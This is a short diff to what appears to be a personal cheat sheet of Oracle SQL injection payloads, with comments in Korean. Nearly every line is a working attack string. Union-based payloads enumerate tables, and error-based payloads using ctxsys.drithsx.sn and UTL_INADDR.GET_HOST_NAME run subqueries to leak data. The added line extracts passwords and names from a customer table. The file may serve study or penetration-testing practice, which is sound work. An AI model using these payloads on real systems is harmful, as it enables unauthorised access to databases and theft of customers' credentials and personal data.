@@ -5,7 +5,7 @@
 ' union select '1','2', '3', '4', '5', '6', '7', '8', '9',tname FROM tab -- 현재 DB에 있는 테이블 조회
 ' and ctxsys.drithsx.sn(user,(select email from customer where name='12345'))=1 --   에러베이스드 서브쿼리 실행
 ' and UTL_INADDR.GET_HOST_NAME((원하는 서브쿼리 내용)) --
-
+' union select '1',password, '3', '4', '5', name,'7', '8', '9','10' FROM customer -- 아이디 비번 알아내기
 
 
 select name,address from customer where name='123' and ctxsys.drithsx.sn(user,(select email from customer where name='12345'))=1       sqlplus에서 테스트
